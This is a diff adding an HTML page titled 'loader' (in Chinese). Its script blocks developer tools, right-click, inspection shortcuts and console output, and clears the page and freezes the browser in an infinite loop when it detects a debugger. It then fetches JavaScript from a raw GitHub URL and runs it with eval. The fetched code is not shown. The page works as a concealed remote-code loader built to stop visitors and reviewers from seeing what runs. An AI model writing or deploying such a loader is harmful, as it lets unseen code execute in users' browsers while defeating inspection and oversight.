@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>加载器</title>
+</head>
+<body>
+    <script>
+        // 反调试代码
+        (function() {
+            // 检测开发者工具
+            const detectDevTools = () => {
+                const threshold = 160;
+                if (window.outerWidth - window.innerWidth > threshold || 
+                    window.outerHeight - window.innerHeight > threshold) {
+                    document.body.innerHTML = '';
+                    while(1);
+                }
+            };
+
+            // 禁用右键
+            document.addEventListener('contextmenu', e => e.preventDefault());
+
+            // 禁用F12和常用快捷键
+            document.addEventListener('keydown', e => {
+                if (e.key === 'F12' || 
+                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
+                    (e.ctrlKey && e.key === 'U')) {
+                    e.preventDefault();
+                    return false;
+                }
+            });
+
+            // 检测调试器
+            setInterval(() => {
+                const start = performance.now();
+                debugger;
+                const end = performance.now();
+                if (end - start > 100) {
+                    document.body.innerHTML = '';
+                    while(1);
+                }
+            }, 1000);
+
+            // 定期检测开发者工具
+            setInterval(detectDevTools, 500);
+
+            // 防止通过console调试
+            const noop = () => {};
+            ['log', 'debug', 'info', 'warn', 'error'].forEach(method => {
+                console[method] = noop;
+            });
+        })();
+
+        // 加载外部脚本并执行
+        fetch('https://raw.githubusercontent.com/xiaomayisjh/share/refs/heads/main/test.js')
+            .then(response => response.text())
+            .then(code => {
+                // 执行脚本
+                eval(code);
+                // 如果脚本定义了createNode函数，调用它并添加到页面
+                if (typeof createNode === 'function') {
+                    const fragment = createNode();
+                    document.body.appendChild(fragment);
+                }
+            })
+            .catch(error => {
+                document.body.innerHTML = '<div style="color: red; padding: 20px;">加载失败: ' + error.message + '</div>';
+            });
+    </script>
+</body>
+</html>
